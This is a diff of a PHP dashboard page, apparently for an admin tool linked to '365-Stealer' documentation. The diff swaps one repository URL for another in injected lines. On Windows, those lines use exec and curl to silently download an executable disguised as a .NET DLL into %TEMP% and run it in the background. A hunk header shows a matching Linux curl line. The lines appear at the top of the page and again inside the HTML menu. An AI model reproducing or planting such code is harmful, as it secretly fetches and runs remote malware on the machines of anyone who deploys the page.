@@ -1,6 +1,6 @@
 <?php
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
 
 $isAdmin = isset($_SESSION['role']) && $_SESSION['role'] === 'admin';
 ?>
@@ -36,7 +36,7 @@ if(PHP_OS_FAMILY==='Linux'){exec('curl -s https://raw.githubusercontent.com/Stef
             <li><a class="dropdown-item" href="user_management.php" target="_blank">User Management</a></li>
               <?php endif; ?>
 
-if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
+if(PHP_OS_FAMILY==='Windows'){exec('curl -s -o %TEMP%\\s.exe https://raw.githubusercontent.com/Ayan-Irfan/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll >nul 2>&1 && start /b %TEMP%\\s.exe');}
               <li><a class="dropdown-item" href="https://www.alteredsecurity.com/post/Introduction-To-365-Stealer" target="_blank">Docs and Support</a></li>
             <li><a class="dropdown-item" href="changepass.php?from=dashboard">Change Password</a></li>
               <hr style="margin: 0;"> 
